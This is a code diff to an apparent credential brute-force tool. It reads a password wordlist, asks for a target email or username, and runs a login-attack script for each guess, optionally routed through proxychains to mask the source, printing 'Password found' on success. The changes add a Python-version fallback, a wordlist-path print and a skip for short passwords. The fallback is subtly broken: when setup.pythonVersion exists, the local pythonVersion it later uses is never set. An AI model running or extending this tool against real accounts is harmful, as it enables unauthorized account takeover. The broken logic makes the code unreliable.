@@ -89,9 +89,13 @@ def function(email,passw,i,headers,url, proxychains):
 	data['cookie'] = cookie
 	data_json = str(json.dumps(data))
 	script = "modules%sAttack%sBruteForce%srun.py" % (slash,slash,slash)
-	cmd = "python%s %s -u %s -d '%s'" % (setup.pythonVersion, script, url, data_json)
+	try:
+		setup.pythonVersion
+	except:
+		pythonVersion = includes.getVersion()
+	cmd = "python%s %s -u %s -d '%s'" % (pythonVersion, script, url, data_json)
 	if proxychains == 1:
-		cmd = "proxychains python%s run.py -u %s -d '%s'" % (setup.pythonVersion, url, data_json)
+		cmd = "proxychains python%s run.py -u %s -d '%s'" % (pythonVersion, url, data_json)
 	result = os.system(cmd)
 	if result == 0:
 		print("Password found: ", passw)
@@ -134,6 +138,7 @@ def run():
 		passFile = dir+slash+passFile
 
 	file = open(passFile,'r')
+	print(passFile)
 	email=input('Email/Username : ')
 
 	print("\nTarget Email ID : ",email)
@@ -144,6 +149,7 @@ def run():
 		passw=file.readline().strip()
 		i+=1
 		if len(passw) < 6:
+			print("[-] Password must have a minimal lenght of 6.\n Skipping password")
 			continue
 		print(str(i) +" : ",passw)
 		if function(email,passw,i, headers, url, proxychains):
